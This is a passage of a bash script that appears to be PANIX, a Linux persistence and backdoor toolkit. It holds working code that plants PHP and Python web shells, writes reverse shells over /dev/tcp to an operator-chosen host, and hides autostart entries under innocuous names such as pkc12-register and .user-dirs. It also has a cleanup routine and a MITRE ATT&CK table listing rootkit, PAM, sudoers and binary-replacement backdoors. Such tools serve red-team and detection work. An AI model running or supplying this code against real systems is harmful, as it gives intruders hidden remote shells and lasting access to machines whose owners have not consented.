				shift
				ip=$1
				;;
			--examples )
				echo "Examples:"
				echo "./panix.sh --web-shell --port 8080 --language php --mechanism cmd"
				echo "./panix.sh --web-shell --port 8080 --language python --mechanism reverse --ip 10.10.10.10 --rev-port 1337"
				exit 0
				;;
			--help|-h )
				usage_web_shell
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './panix.sh --web-shell --help' for more information."
				exit 1
		esac
		shift
	done

	# Validate required arguments
	if [[ -z $port || -z $language || -z $mechanism ]]; then
		echo "Error: --port, --language, and --mechanism must be specified."
		echo "Try './panix.sh --web-shell --help' for more information."
		exit 1
	fi

	if [[ $mechanism == "reverse" && ( -z $ip || -z $rev_port ) ]]; then
		echo "Error: --ip and --rev-port must be specified when using the reverse mechanism."
		echo "Try './panix.sh --web-shell --help' for more information."
		exit 1
	fi

	# Determine web server directory based on user privileges
	if [[ $UID -eq 0 ]]; then
		dir="/var/www/html/panix/"
	else
		dir="$HOME/panix/"
	fi

	mkdir -p "$dir"
	echo "[+] Web server directory created at $dir"

	# Create appropriate file based on mechanism
	case $mechanism in
		cmd )
			if [[ $language == "php" ]]; then
				echo "<?php if(isset(\$_REQUEST['cmd'])){\$cmd=(\$_REQUEST['cmd']);system(\$cmd);die;}?>" > "${dir}cmd.php"
				echo "[+] cmd.php file created in $dir"
				echo "[+] Interact via: curl http://<ip>:$port/cmd.php?cmd=whoami"
			elif [[ $language == "python" ]]; then
				cgi_dir="${dir}cgi-bin/"
				mkdir -p "$cgi_dir"
cat <<EOF > "${cgi_dir}cmd.py"
#!/usr/bin/env python3
import os, cgi

form = cgi.FieldStorage()
cmd = form.getvalue('cmd', '')

if cmd:
	print("Content-Type: text/plain\\n")
	print(os.popen(cmd).read())
EOF
				chmod +x "${cgi_dir}cmd.py"
				echo "[+] cmd.py file created in $cgi_dir"
				echo "[+] Interact via: curl http://<ip>:$port/cgi-bin/cmd.py?cmd=whoami"
			else
				echo "[-] Error: Unsupported language specified for cmd mechanism."
				exit 1
			fi
			;;
		reverse )
			if [[ $language == "php" ]]; then
				echo "<?php exec(\"/bin/bash -c 'nohup setsid bash -i > /dev/tcp/$ip/$rev_port 0>&1'\");?>" > "${dir}reverse.php"
				echo "[+] reverse.php file created in $dir"
				echo "[+] Interact via: curl http://<ip>:$port/reverse.php"
			elif [[ $language == "python" ]]; then
				cgi_dir="${dir}cgi-bin/"
				mkdir -p "$cgi_dir"
				cat <<-EOF > "${cgi_dir}reverse.py"
				#!/usr/bin/env python3
				import os
				os.system("/bin/bash -c 'nohup setsid bash -i > /dev/tcp/$ip/$rev_port 0>&1'")
				EOF
				chmod +x "${cgi_dir}reverse.py"
				echo "[+] reverse.py file created in $cgi_dir"
				echo "[+] Interact via: curl http://<ip>:$port/cgi-bin/reverse.py"
			else
				echo "[-] Error: Unsupported language specified for reverse mechanism."
				exit 1
			fi
			;;
		* )
			echo "[-] Error: Invalid mechanism specified. Use cmd or reverse."
			exit 1
	esac

	# Start web server
	case $language in
		php )
			if command -v php &>/dev/null; then
				if lsof -i :"$port" &>/dev/null; then
					echo "[-] Error: A process is already running on port $port. Aborting."
					exit 1
				fi
				echo "[!] Starting PHP server on port $port..."
				nohup php -S 0.0.0.0:$port -t "$dir" &>/dev/null &
				echo "[+] PHP server running in the background at port $port."
			else
				echo "[-] Error: PHP is not installed on this system."
				exit 1
			fi
			;;
		python )
			if command -v python3 &>/dev/null; then
				if lsof -i :"$port" &>/dev/null; then
					echo "[-] Error: A process is already running on port $port. Aborting."
					exit 1
				fi
				echo "[!] Starting Python3 server on port $port with CGI enabled..."
				cgi_dir="${dir}cgi-bin/"
				cd "$dir"
				nohup python3 -m http.server --cgi $port &>/dev/null &
				echo "[+] Python3 server running in the background at port $port."
			elif command -v python &>/dev/null; then
				if lsof -i :"$port" &>/dev/null; then
					echo "[-] Error: A process is already running on port $port. Aborting."
					exit 1
				fi
				echo "[!] Starting Python2 server on port $port with CGI enabled..."
				cgi_dir="${dir}cgi-bin/"
				cd "$dir"
				nohup python -m CGIHTTPServer $port &>/dev/null &
				echo "[+] Python2 server running in the background at port $port."
			else
				echo "[-] Error: Neither Python3 nor Python2 is installed on this system."
				exit 1
			fi
			;;
		* )
			echo "[-] Error: Unsupported language specified. Use php or python."
			exit 1
	esac
}

# Module: setup_xdg.sh
setup_xdg() {
	if [[ ! -d "/etc/xdg" ]]; then
		echo "Warning: /etc/xdg directory does not exist. XDG might not be present on this system."
	fi

	usage_xdg() {
		echo "Usage: ./panix.sh --xdg [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default xdg settings"
		echo "  --ip <ip>                  Specify IP address"
		echo "  --port <port>              Specify port number"
		echo "--custom                     Use custom xdg settings (make sure they are valid!)"
		echo "  --path <path>                Specify custom desktop entry path"
		echo "  --command <command>          Specify custom persistence command"
	}

	local profile_path=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--path )
				shift
				profile_path=$1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --xdg --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --xdg --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/etc/xdg/autostart/evilxdg.desktop\""
				exit 0
				;;
			--help|-h)
				usage_xdg
				exit 0
				;;
			* )
				echo "Invalid option for --xdg: $1"
				echo "Try './panix.sh --xdg --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --xdg --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --xdg --help' for more information."
			exit 1
		fi

		if check_root; then
			profile_path="/etc/xdg/autostart/pkc12-register.desktop"
			command="/etc/xdg/pkc12-register"
			mkdir -p /etc/xdg/autostart
			echo -e "[Desktop Entry]\nType=Application\nExec=$command\nName=pkc12-register" > $profile_path
			echo -e "#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" > $command
			chmod +x $command
		else
			local current_user=$(whoami)
			profile_path="/home/$current_user/.config/autostart/user-dirs.desktop"
			command="/home/$current_user/.config/autostart/.user-dirs"
			mkdir -p /home/$current_user/.config/autostart
			echo -e "[Desktop Entry]\nType=Application\nExec=$command\nName=user-dirs" > $profile_path
			echo -e "#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" > $command
			chmod +x $command
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $profile_path || -z $command ]]; then
			echo "Error: --file and --command must be specified when using --custom."
			echo "Try './panix.sh --xdg --help' for more information."
			exit 1
		fi

		if check_root; then
			local exec_path=${profile_path%.desktop}
			echo -e "[Desktop Entry]\nType=Application\nExec=$exec_path\nName=$(basename $exec_path)" > $profile_path
			echo -e "#!/bin/bash\n$command" > $exec_path
			chmod +x $exec_path
		else
			local current_user=$(whoami)
			profile_path="/home/$current_user/.config/autostart/$(basename $profile_path)"
			local exec_path="/home/$current_user/.config/autostart/$(basename ${profile_path%.desktop})"
			mkdir -p /home/$current_user/.config/autostart
			echo -e "[Desktop Entry]\nType=Application\nExec=$exec_path\nName=$(basename $exec_path)" > $profile_path
			echo -e "#!/bin/bash\n$command" > $exec_path
			chmod +x $exec_path
		fi
	else
		echo "Error: Either --default or --custom must be specified for --xdg."
		echo "Try './panix.sh --xdg --help' for more information."
		exit 1
	fi

	echo "[+] XDG persistence established!"
}

revert_changes() {
	local current_user=$(whoami)
	local ssh_dir="/home/$current_user/.ssh"
	local is_root=false
	local in_docker_group=false
	local malicious_entry="/dev/tcp"

	# Check if running as root
	if [ "$(id -u)" -eq 0 ]; then
		is_root=true
	fi

	# Check if the user is in the docker group
	if groups $current_user | grep -q '\bdocker\b'; then
		in_docker_group=true
	fi

	if $is_root; then
		echo "[*] Running as root..."
	else
		echo "[*] Running as user..."
	fi

	# Systemd
	echo "[*] Cleaning Systemd persistence methods..."
	if $is_root; then
		systemctl stop dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
		systemctl disable dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
		rm -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service
		rm -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer
	fi
	rm -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service
	rm -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer
	if ! $is_root; then
		systemctl --user stop dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
		systemctl --user disable dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
	fi
	echo "[+] Successfully cleaned persistence method Systemd"

	# Systemd Generator
	echo "[*] Cleaning Systemd Generator persistence methods..."
	if $is_root; then
		systemctl stop generator.service 2>/dev/null
		systemctl disable generator.service 2>/dev/null
		rm -f /usr/lib/systemd/system-generators/makecon
		rm -f /usr/lib/systemd/system-generators/generator
		rm -f /run/systemd/system/generator.service
		rm -f /run/systemd/system/multi-user.target.wants/generator.service
	else
		systemctl --user stop generator.service 2>/dev/null
		systemctl --user disable generator.service 2>/dev/null
	fi
	echo "[+] Successfully cleaned persistence method Systemd Generator"

	# Cron
	echo "[*] Cleaning Cron persistence methods..."
	if $is_root; then
		rm -f /etc/cron.d/freedesktop_timesync1
		for file in /etc/cron*; do
			[ -e "$file" ] && sed -i "/$malicious_entry/ d" $file 2>/dev/null
		done
	fi
	crontab -l | grep -v "$malicious_entry" | crontab -
	echo "[+] Successfully cleaned persistence method Cron"

	# At
	echo "[*] Cleaning At persistence methods..."
	if $is_root; then
		for file in /var/spool/cron/atjobs/*; do
			[ -e "$file" ] && sed -i "/$malicious_entry/ d" $file 2>/dev/null
		done
	fi
	echo "[+] Successfully cleaned persistence method At"

	# Shell profile
	echo "[*] Cleaning Shell profile persistence methods..."
	if $is_root; then
		[ -e "/etc/profile" ] && sed -i "/$malicious_entry/ d" /etc/profile 2>/dev/null
	fi
	[ -e "/home/$current_user/.bash_profile" ] && sed -i "/$malicious_entry/ d" /home/$current_user/.bash_profile 2>/dev/null
	echo "[+] Successfully cleaned persistence method Shell profile"

	# XDG
	echo "[*] Cleaning XDG persistence methods..."
	if $is_root; then
		rm -f /etc/xdg/autostart/pkc12-register.desktop
		rm -f /etc/xdg/pkc12-register
	fi
	rm -f /home/$current_user/.config/autostart/user-dirs.desktop
	rm -f /home/$current_user/.config/autostart/.user-dirs
	echo "[+] Successfully cleaned persistence method XDG"

	# SSH
	echo "[*] Cleaning SSH persistence methods..."
	rm -f $ssh_dir/id_rsa1822
	rm -f $ssh_dir/id_rsa1822.pub
	echo "[+] Successfully cleaned persistence method SSH"

	# Sudoers
	echo "[*] Cleaning Sudoers persistence methods..."
	if $is_root; then
		rm -f /etc/sudoers.d/$current_user
	fi
	echo "[+] Successfully cleaned persistence method Sudoers"

	# Setuid
	echo "[*] Cleaning Setuid persistence methods..."
	if $is_root; then
		for bin in find dash python python3; do
			[ -e "$(which $bin)" ] && chmod u-s $(which $bin) 2>/dev/null
		done
	fi
	echo "[+] Successfully cleaned persistence method Setuid"

	# MOTD
	echo "[*] Cleaning MOTD persistence methods..."
	if $is_root; then
		rm -f /etc/update-motd.d/137-python-upgrades
		for file in /etc/update-motd.d/*; do
			[ -e "$file" ] && sed -i "/$malicious_entry/ d" $file 2>/dev/null
		done
	fi
	echo "[+] Successfully cleaned persistence method MOTD"

	# rc.local
	echo "[*] Cleaning rc.local persistence methods..."
	if $is_root; then
		[ -e "/etc/rc.local" ] && sed -i "/$malicious_entry/ d" /etc/rc.local 2>/dev/null
	fi
	echo "[+] Successfully cleaned persistence method rc.local"

	# initd
	echo "[*] Cleaning initd persistence methods..."
	if $is_root; then
		rm -f /etc/init.d/ssh-procps
	fi
	echo "[+] Successfully cleaned persistence method initd"

	# Package Managers
	echo "[*] Cleaning Package Managers persistence methods..."
	if $is_root; then
		rm -f /etc/apt/apt.conf.d/01python-upgrades
		rm -f /usr/lib/yumcon
		rm -f /usr/lib/yum-plugins/yumcon.py
		rm -f /etc/yum/pluginconf.d/yumcon.conf
		local python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
		[ -n "$python_version" ] && rm -f /usr/lib/$python_version/site-packages/dnfcon
		rm -f /etc/dnf/plugins/dnfcon.conf
		[ -n "$python_version" ] && rm -f /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
	fi
	echo "[+] Successfully cleaned persistence method Package Managers"

	# setcap
	echo "[*] Cleaning setcap persistence methods..."
	if $is_root; then
		for bin in perl ruby php python python3 node; do
			[ -e "$(which $bin)" ] && setcap -r $(which $bin) 2>/dev/null
		done
	fi
	echo "[+] Successfully cleaned persistence method setcap"

	# Bind shell
	echo "[*] Cleaning Bind shell persistence methods..."
	if $is_root; then
		pkill -f /tmp/bd86 2>/dev/null
		pkill -f /tmp/bd64 2>/dev/null
	fi
	rm -f /tmp/bd86
	rm -f /tmp/bd64
	echo "[+] Successfully cleaned persistence method Bind shell"

	# Backdoor binaries
	echo "[*] Cleaning Backdoor binaries persistence methods..."
	if $is_root; then
		for binary in cat ls; do
			original=$(which $binary).original
			if [ -f "$original" ]; then
				mv "$original" "$(which $binary)" 2>/dev/null
				if [ $? -eq 0 ]; then
					echo "[+] Successfully restored $binary binary"
				else
					echo "[-] Failed to restore $binary binary"
				fi
			else
				echo "[*] No original file for $binary found, skipping..."
			fi
		done
	fi
	echo "[+] Successfully cleaned persistence method Backdoor binaries"

	# udev
	echo "[*] Cleaning udev persistence methods..."
	if $is_root; then
		rm -f /usr/bin/atest
		rm -f /etc/udev/rules.d/10-atest.rules
		rm -f /usr/bin/crontest
		rm -f /etc/udev/rules.d/11-crontest.rules
		rm -f /etc/udev/rules.d/12-systemdtest.rules
		systemctl stop systemdtest.service 2>/dev/null
		systemctl disable systemdtest.service 2>/dev/null
		rm -f /etc/systemd/system/systemdtest.service
	fi
	echo "[+] Successfully cleaned persistence method udev"

	# Git
	echo "[*] Cleaning Git persistence methods..."
	local repos=$(find / -name ".git" -type d 2>/dev/null)

	if [[ -z $repos ]]; then
		echo "[-] No Git repositories found."
	else
		for repo in $repos; do
			local git_repo=$(dirname $repo)
			local pre_commit_file="$git_repo/.git/hooks/pre-commit"
			local git_config="$git_repo/.git/config"
			local user_git_config="/home/$current_user/.gitconfig"

			# Remove malicious pre-commit hook
			if [[ -f $pre_commit_file ]]; then
				if grep -q "$malicious_entry" $pre_commit_file; then
					sed -i "/$malicious_entry/ d" $pre_commit_file
					echo "[+] Removed malicious entry from pre-commit hook in $git_repo"
				fi
			fi

			# Remove malicious pager configuration from repo config
			if [[ -f $git_config ]]; then
				if grep -q "$malicious_entry" $git_config; then
					sed -i "/$malicious_entry/ d" $git_config
					echo "[+] Removed malicious pager from Git config in $git_repo"
				fi
			fi

			# Remove malicious pager configuration from global config
			if [[ -f $user_git_config ]]; then
				if grep -q "$malicious_entry" $user_git_config; then
					sed -i "/$malicious_entry/ d" $user_git_config
					echo "[+] Removed malicious pager from global Git config"
				fi
			fi
		done
	fi
	echo "[+] Successfully cleaned persistence method Git"

	# Docker
	echo "[*] Cleaning Docker persistence methods..."
	if $is_root || $in_docker_group; then
		rm -f /tmp/Dockerfile
		docker stop malicious-container 2>/dev/null
		docker rm malicious-container 2>/dev/null
	fi
	echo "[+] Successfully cleaned persistence method Docker"

	# Malicious package
	echo "[*] Cleaning Malicious package persistence methods..."
	if $is_root; then
		rm -f /var/lib/rpm/panix.rpm
		rm -f /var/lib/dpkg/info/panix.postinst
		sed -i '/panix.rpm/ d' /var/spool/cron/$current_user
		sed -i '/panix.postinst/ d' /var/spool/cron/crontabs/$current_user
	fi
	echo "[+] Successfully cleaned persistence method Malicious package"
}

display_mitre_matrix() {
    echo -e "\n\033[1;34mMITRE ATT&CK Matrix - Persistence Techniques Supported by PANIX\033[0m\n"
    printf "%-25s %-40s %-15s %-40s %-20s %-70s\n" "Persistence Method" "Technique Name" "Technique ID" "Sub-technique Name" "Sub-technique ID" "URL"
    printf "%-25s %-40s %-15s %-40s %-20s %-70s\n" "-------------------" "--------------" "-------------" "-----------------" "---------------" "---------------------------------------------"

    printf "%-25s %-40s %-15s %-40s %-20s %-70s\n" \
        "--at" "Scheduled Task" "T1053" "At" "T1053.002" "https://attack.mitre.org/techniques/T1053/002" \
        "--authorized-keys" "Account Manipulation" "T1098" "SSH Authorized Keys" "T1098.004" "https://attack.mitre.org/techniques/T1098/004" \
        "--backdoor-user" "Create Account" "T1136" "Local Account" "T1136.001" "https://attack.mitre.org/techniques/T1136/001" \
        "--bind-shell" "Command and Scripting Interpreter" "T1059" "Unix Shell" "T1059.004" "https://attack.mitre.org/techniques/T1059/004" \
        "--cap" "Abuse Elevation Control Mechanism" "T1548" "N/A" "N/A" "https://attack.mitre.org/techniques/T1548" \
        "--create-user" "Create Account" "T1136" "Local Account" "T1136.001" "https://attack.mitre.org/techniques/T1136/001" \
        "--cron" "Scheduled Task" "T1053" "Cron" "T1053.003" "https://attack.mitre.org/techniques/T1053/003" \
        "--docker-container" "Escape to Host" "T1610" "N/A" "N/A" "https://attack.mitre.org/techniques/T1610" \
        "--generator" "Create or Modify System Process" "T1543" "Systemd Service" "T1543.002" "https://attack.mitre.org/techniques/T1543/002" \
        "--git" "Event Triggered Execution" "T1546" "N/A" "N/A" "https://attack.mitre.org/techniques/T1546" \
        "--initd" "Boot or Logon Initialization Scripts" "T1037" "N/A" "N/A" "https://attack.mitre.org/techniques/T1037" \
        "--ld-preload" "Hijack Execution Flow" "T1574" "Dynamic Linker Hijacking" "T1574.006" "https://attack.mitre.org/techniques/T1574/006" \
        "--lkm" "Boot or Logon Autostart Execution" "T1547" "Kernel Modules and Extensions" "T1547.006" "https://attack.mitre.org/techniques/T1547/006" \
        "--malicious-package" "Event Triggered Execution" "T1546" "Installer Packages" "T1546.016" "https://attack.mitre.org/techniques/T1546/016" \
        "--motd" "Boot or Logon Initialization Scripts" "T1037" "N/A" "N/A" "https://attack.mitre.org/techniques/T1037" \
        "--package-manager" "Event Triggered Execution" "T1546" "Installer Packages" "T1546.016" "https://attack.mitre.org/techniques/T1546/016" \
        "--pam" "Modify Authentication Process" "T1556" "Pluggable Authentication Modules" "T1556.003" "https://attack.mitre.org/techniques/T1556/003" \
        "--passwd-user" "Account Manipulation" "T1098" "N/A" "N/A" "https://attack.mitre.org/techniques/T1098" \
        "--password-change" "Account Manipulation" "T1098" "N/A" "N/A" "https://attack.mitre.org/techniques/T1098" \
        "--rc-local" "Boot or Logon Initialization Scripts" "T1037" "RC Scripts" "T1037.004" "https://attack.mitre.org/techniques/T1037/004" \
        "--reverse-shell" "Command and Scripting Interpreter" "T1059" "Unix Shell" "T1059.004" "https://attack.mitre.org/techniques/T1059/004" \
        "--rootkit" "Rootkit" "T1014" "N/A" "N/A" "https://attack.mitre.org/techniques/T1014" \
        "--shell-profile" "Event Triggered Execution" "T1546" "Unix Shell Configuration Modification" "T1546.004" "https://attack.mitre.org/techniques/T1546/004" \
        "--ssh-key" "Account Manipulation" "T1098" "SSH Authorized Keys" "T1098.004" "https://attack.mitre.org/techniques/T1098/004" \
        "--sudoers" "Abuse Elevation Control Mechanism" "T1548" "Sudo and Sudo Caching" "T1548.003" "https://attack.mitre.org/techniques/T1548/003" \
        "--suid" "Abuse Elevation Control Mechanism" "T1548" "Setuid and Setgid" "T1548.001" "https://attack.mitre.org/techniques/T1548/001" \
        "--system-binary" "Compromise Host Software Binary" "T1554" "N/A" "N/A" "https://attack.mitre.org/techniques/T1554" \
        "--systemd" "Create or Modify System Process" "T1543" "Systemd Service" "T1543.002" "https://attack.mitre.org/techniques/T1543/002" \
        "--udev" "Event Triggered Execution" "T1546" "Udev Rules" "T1546.017" "https://attack.mitre.org/techniques/T1546/017" \
        "--web-shell" "Server Software Component" "T1505" "Web Shell" "T1505.003" "https://attack.mitre.org/techniques/T1505/003" \
        "--xdg" "Boot or Logon Autostart Execution" "T1547" "XDG Autostart Entries" "T1547.013" "https://attack.mitre.org/techniques/T1547/013"
    
    echo -e "\n\033[1;32mLegend:\033[0m"
    echo "Technique: High-level MITRE ATT&CK technique."
    echo "Sub-Technique: Specific sub-technique under a high-level technique."
    echo "N/A: No specific sub-technique defined for this method."
    echo "URL: Link to the official MITRE ATT&CK page for further details."
    echo ""
}

# Main script logic
# Only source modules dynamically if the script is executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    MODULES_DIR="$(dirname "${BASH_SOURCE[0]}")/modules"
    for module in "$MODULES_DIR"/*.sh; do
        if [[ -f $module ]]; then
            source "$module"
        fi
    done
fi

main() {
	local QUIET=0

	if [[ $# -eq 0 ]]; then
		if [[ $QUIET -ne 1 ]]; then
			print_banner
		fi
		if check_root; then
			usage_root
		else
			usage_user
		fi
		exit 0
	fi

	# Parse command line arguments
	while [[ "$1" != "" ]]; do
		case $1 in
			-q | --quiet )
				QUIET=1
				;;
			-h | --help )
				if check_root; then
					usage_root
				else
					usage_user
				fi
				exit
				;;
			--mitre-matrix )
				display_mitre_matrix
				exit
				;;
			--revert )
				shift
				revert_changes
				exit
				;;
			--at )
				shift
				setup_at "$@"
				exit
				;;
			--authorized-keys )
				shift
				setup_authorized_keys "$@"
				exit
				;;
			--backdoor-user )
				shift
				setup_backdoor_user "$@"
				exit
				;;
			--bind-shell )
				shift
				setup_bind_shell "$@"
				exit
				;;
			--cap )
				shift
				setup_cap_backdoor "$@"
				exit
				;;
			--create-user )
				shift
				setup_create_new_user "$@"
				exit
				;;
			--cron )
				shift
				setup_cron "$@"
				exit
				;;
			--generator )
				shift
				setup_generator_persistence "$@"
				exit
				;;
			--git )
				shift
				setup_git_persistence "$@"
				exit
				;;
			--initd )
				shift
				setup_initd_backdoor "$@"
				exit
				;;
			--ld-preload )
				shift
				setup_ld_preload_backdoor "$@"
				exit
				;;
			--lkm )
				shift
				setup_lkm_backdoor "$@"
				exit
				;;
			--malicious-container )
				shift
				setup_malicious_docker_container "$@"
				exit
				;;
			--malicious-package )
				shift
				setup_malicious_package "$@"
				exit
				;;
			--motd )
				shift
				setup_motd_backdoor "$@"
				exit
				;;
			--package-manager )
				shift
				setup_package_manager_persistence "$@"
				exit
				;;
			--pam )
				shift
				setup_pam_persistence "$@"
				exit
				;;
			--passwd-user )
				shift
				setup_passwd_user "$@"
				exit
				;;
			--password-change )
				shift
				setup_password_change "$@"
				exit
				;;
			--rc-local )
				shift
				setup_rc_local_backdoor "$@"
				exit
				;;
			--reverse-shell )
				shift
				setup_reverse_shell "$@"
				exit
				;;
			--rootkit )
				shift
				setup_rootkit "$@"
				exit
				;;
			--shell-profile )
				shift
				setup_shell_profile "$@"
				exit
				;;
			--ssh-key )
				shift
				setup_ssh_key "$@"
				exit
				;;
			--sudoers )
				shift
				setup_sudoers_backdoor "$@"
				exit
				;;
			--suid )
				shift
				setup_suid_backdoor "$@"
				exit
				;;
			--system-binary )
				shift
				setup_system_binary_backdoor "$@"
				exit
				;;
			--systemd )
				shift
				setup_systemd "$@"
				exit
				;;
			--udev )
				shift
				setup_udev "$@"
				exit
				;;
			--web-shell )
				shift
				setup_web_shell "$@"
				exit
				;;
			--xdg )
				shift
				setup_xdg "$@"
				exit
				;;
			* )
				echo "Invalid option: $1"
				if check_root; then
					usage_root
				else
					usage_user
				fi
				exit 1
		esac
		shift
	done

	# Print banner unless in quiet mode
	if [[ $QUIET -ne 1 ]]; then
		print_banner
	fi

	# Show the usage menu if no specific command is given
	if check_root; then
		usage_root
	else
		usage_user
	fi
}

main "$@"
